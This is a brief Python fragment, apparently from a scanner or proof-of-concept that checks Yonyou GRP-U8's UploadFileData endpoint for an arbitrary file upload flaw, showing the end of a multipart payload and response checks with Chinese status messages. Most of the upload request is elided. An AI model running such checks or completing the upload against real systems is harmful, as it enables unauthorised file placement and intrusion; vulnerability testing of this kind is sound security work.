...
------WebKitFormBoundary92pUawKc--'''
    try:
        ...
        if response.status_code == 200 and "123" in response.text:
            return now_time() + " [SUCCESS]  用友 GRP-U8 UploadFileData 任意文件上传漏洞，测试URL为: {}".format(shell_url)
        else:
            return now_time() + " [WARNING]  用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在"
    except:
        return now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在'
